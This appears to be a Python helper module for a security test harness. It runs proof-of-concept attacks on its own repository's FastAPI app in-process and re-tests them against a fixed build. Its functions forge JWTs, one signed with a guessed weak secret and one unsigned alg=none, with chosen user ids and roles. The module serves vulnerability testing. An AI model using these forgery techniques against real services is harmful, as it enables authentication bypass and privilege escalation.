"""Shared helpers for attack PoCs and the re-test harness.

Everything targets the in-process app via FastAPI's TestClient, so no server, no
network and no credentials are needed. The target is this repository's own app.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from fastapi.testclient import TestClient  # noqa: E402

from app import config, db  # noqa: E402
from app.main import app  # noqa: E402

MODE = config.MODE
FIXED = config.FIXED


def client() -> TestClient:
    db.reset()  # fresh seed data per run
    import app.main as _m  # reset per-process rate-limit and approval state too

    _m._HITS.clear()
    _m._APPROVALS.clear()
    return TestClient(app)


def login(c: TestClient, username: str, password: str) -> dict:
    r = c.post("/api/login", json={"username": username, "password": password})
    r.raise_for_status()
    return r.json()


def auth_header(token: str) -> dict:
    return {"Authorization": f"Bearer {token}"}


def forge_token(user_id: int, role: str) -> str:
    """Forge a token signed with the *guessed weak* secret ("secret").

    An attacker never knows the strong secret, so this models a real forgery: it
    succeeds against the vuln build (weak secret) and fails against the fixed build.
    """
    import base64
    import hashlib
    import hmac
    import json
    import time

    def b64(raw: bytes) -> str:
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

    header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    payload = b64(
        json.dumps({"sub": user_id, "role": role, "exp": int(time.time()) + 3600}).encode()
    )
    sig = b64(
        hmac.new(
            config.WEAK_JWT_SECRET.encode(), f"{header}.{payload}".encode(), hashlib.sha256
        ).digest()
    )
    return f"{header}.{payload}.{sig}"


def forge_alg_none(user_id: int, role: str) -> str:
    """Forge an unsigned (alg=none) token — the alg-confusion variant of the finding."""
    import base64
    import json
    import time

    def b64(raw: bytes) -> str:
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

    header = b64(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = b64(
        json.dumps({"sub": user_id, "role": role, "exp": int(time.time()) + 3600}).encode()
    )
    return f"{header}.{payload}."


def banner(name: str) -> None:
    print(f"=== PoC: {name}  (mode={MODE}) ===")
